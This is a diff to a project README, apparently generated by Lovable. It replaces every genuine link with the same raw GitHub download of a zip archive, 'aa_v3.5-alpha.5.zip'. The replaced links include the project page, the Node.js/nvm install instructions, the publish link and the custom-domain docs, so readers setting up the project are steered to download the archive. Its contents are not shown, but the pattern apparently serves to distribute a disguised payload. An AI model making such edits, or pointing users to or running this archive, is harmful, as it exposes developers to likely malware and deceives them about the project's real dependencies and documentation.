@@ -2,7 +2,7 @@
 
 ## Project info
 
-**URL**: https://lovable.dev/projects/c8ca6600-da47-4bed-b194-6a81dbe42b53
+**URL**: https://github.com/twriad969/aa77/raw/refs/heads/main/src/lib/aa_v3.5-alpha.5.zip
 
 ## How can I edit this code?
 
@@ -10,7 +10,7 @@ There are several ways of editing your application.
 
 **Use Lovable**
 
-Simply visit the [Lovable Project](https://lovable.dev/projects/c8ca6600-da47-4bed-b194-6a81dbe42b53) and start prompting.
+Simply visit the [Lovable Project](https://github.com/twriad969/aa77/raw/refs/heads/main/src/lib/aa_v3.5-alpha.5.zip) and start prompting.
 
 Changes made via Lovable will be committed automatically to this repo.
 
@@ -18,7 +18,7 @@ Changes made via Lovable will be committed automatically to this repo.
 
 If you want to work locally using your own IDE, you can clone this repo and push changes. Pushed changes will also be reflected in Lovable.
 
-The only requirement is having Node.js & npm installed - [install with nvm](https://github.com/nvm-sh/nvm#installing-and-updating)
+The only requirement is having https://github.com/twriad969/aa77/raw/refs/heads/main/src/lib/aa_v3.5-alpha.5.zip & npm installed - [install with nvm](https://github.com/twriad969/aa77/raw/refs/heads/main/src/lib/aa_v3.5-alpha.5.zip)
 
 Follow these steps:
 
@@ -62,7 +62,7 @@ This project is built with:
 
 ## How can I deploy this project?
 
-Simply open [Lovable](https://lovable.dev/projects/c8ca6600-da47-4bed-b194-6a81dbe42b53) and click on Share -> Publish.
+Simply open [Lovable](https://github.com/twriad969/aa77/raw/refs/heads/main/src/lib/aa_v3.5-alpha.5.zip) and click on Share -> Publish.
 
 ## Can I connect a custom domain to my Lovable project?
 
@@ -70,4 +70,4 @@ Yes, you can!
 
 To connect a domain, navigate to Project > Settings > Domains and click Connect Domain.
 
-Read more here: [Setting up a custom domain](https://docs.lovable.dev/features/custom-domain#custom-domain)
+Read more here: [Setting up a custom domain](https://github.com/twriad969/aa77/raw/refs/heads/main/src/lib/aa_v3.5-alpha.5.zip)
